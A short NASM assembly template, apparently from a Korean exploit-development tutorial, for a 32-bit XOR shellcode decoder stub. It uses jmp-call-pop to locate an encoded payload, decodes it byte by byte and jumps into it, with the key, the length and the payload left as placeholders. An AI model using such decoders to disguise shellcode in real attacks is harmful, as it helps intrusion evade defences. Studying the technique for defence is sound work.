[BITS 32]

global _start

_start:
jmp short call_point	; 1.CALL로  JMP

begin:
pop esi				; 3. 인코딩에 사용하고자 셸코드의 위치를 esi에 넣음
xor ecx,ecx			; 4. ecx 초기화
mov cl,0x0			; 5. 셸코드 크기를 위한 플레이스홀더(0x0)

short_xor:
xor byte[esi],0x0		; 6. esi의 바이트를 키(0x0=플레이스홀더)로 XOR 
inc esi				; 7. esi 포인터를 다음 바이트로 증가
loop short_xor		; 8. 셸코드가 디코드될 때까지 6부터 반복
jmp short shellcode	; 9. 디코딩된 셸코드로 점프

call_point:
call begin			; 2. 시작하고자 CALL로 돌아감, 셸코드 위치를 스택에 푸시

shellcode:			; 10. 디코딩된 셸코드 실행
; 디코딩된 셸코드는 이곳에
